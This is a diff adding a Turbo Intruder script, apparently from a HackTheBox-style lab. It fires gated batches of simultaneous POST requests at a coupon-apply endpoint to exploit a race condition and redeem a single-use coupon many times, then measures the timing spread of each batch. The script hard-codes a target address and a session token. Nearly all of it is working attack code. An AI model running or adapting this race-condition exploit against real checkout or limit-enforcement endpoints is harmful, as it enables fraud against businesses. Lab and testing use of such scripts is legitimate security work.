@@ -1,0 +1,63 @@
+def queueRequests(target, wordlists):
+
+    global BATCH_SIZE
+    BATCH_SIZE = 20
+
+
+    engine = RequestEngine(endpoint='http://94.237.53.58:50782/',
+                           concurrentConnections=BATCH_SIZE,
+                           requestsPerConnection=100,
+                           engine=Engine.THREADED,
+                           pipeline=False,
+                           maxQueueSize=BATCH_SIZE
+                           )
+    req = '''POST /api/coupons/apply HTTP/1.1
+Host: 94.237.53.58:50782
+User-Agent: curl/8.5.0
+Accept: */*
+Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InR5bGVyXzljNTk5Y2UyOWEiLCJpYXQiOjE3MDkyNjk3MjR9.9Dfcq35Sq2Gkp6R1gH2DE7Dzl9gJk13PYS1IeekE1dQ
+Content-Type: application/json
+Content-Length: 51
+Connection: close
+
+{"username":"%s","coupon_code":"HTB_100"}
+'''
+
+    for i in range(10):
+        gate_id = str(i)
+
+        for x in range(BATCH_SIZE):
+            engine.queue(req, '0.000', gate=gate_id)
+
+        engine.openGate(gate_id)
+        time.sleep(0.5)
+
+
+def handleResponse(req, interesting):
+    xtime= req.response.split('\r\n\r\n')[1]
+    req.label = xtime
+    table.add(req)
+
+
+def completed(reqsFromTable):
+    diffs = []
+    time.sleep(1)
+    print len(reqsFromTable)
+    for i in range(len(reqsFromTable)):
+        if i % BATCH_SIZE != 0:
+            continue
+
+        entries = []
+        for x in range(BATCH_SIZE):
+            entries.append(float(reqsFromTable[i+x].label))
+
+        entries.sort()
+        diffs.append(entries[-1] - entries[0])
+
+    diffs.sort()
+    print('Best: '+str(min(diffs)))
+    print('Mean: '+str(mean(diffs)))
+    print('Stddev: '+str(stddev(diffs)))
+    print('Median: '+str(diffs[len(diffs)/2]))
+    print('Range: '+str(max(diffs)-min(diffs)))
+    handler.setMessage(str(sum(diffs)/len(diffs)))
